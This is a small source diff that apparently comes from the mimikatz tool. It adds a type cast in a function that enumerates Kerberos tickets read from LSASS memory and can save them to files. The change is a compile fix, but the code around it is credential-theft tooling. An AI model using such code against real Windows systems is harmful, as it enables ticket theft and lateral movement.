@@ -528,7 +528,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 					kprintf(L"\n\t [%08x]", nbTickets);
 					if(pKiwiTicket = kuhl_m_sekurlsa_kerberos_createTicket((LPBYTE) aTicket.address, pData->cLsass->hLsassMem))
 					{
-						isNormalSessionKey = (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10) || (pKiwiTicket->Key.Length < FIELD_OFFSET(LSAISO_DATA_BLOB, data));
+						isNormalSessionKey = (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10) || (pKiwiTicket->Key.Length < (ULONG) FIELD_OFFSET(LSAISO_DATA_BLOB, data));
 						kuhl_m_kerberos_ticket_display(pKiwiTicket, isNormalSessionKey, FALSE);
 						if(isFile)
 							if(filename = kuhl_m_sekurlsa_kerberos_generateFileName(pData->LogonId, grp, nbTickets, pKiwiTicket, MIMIKATZ_KERBEROS_EXT))
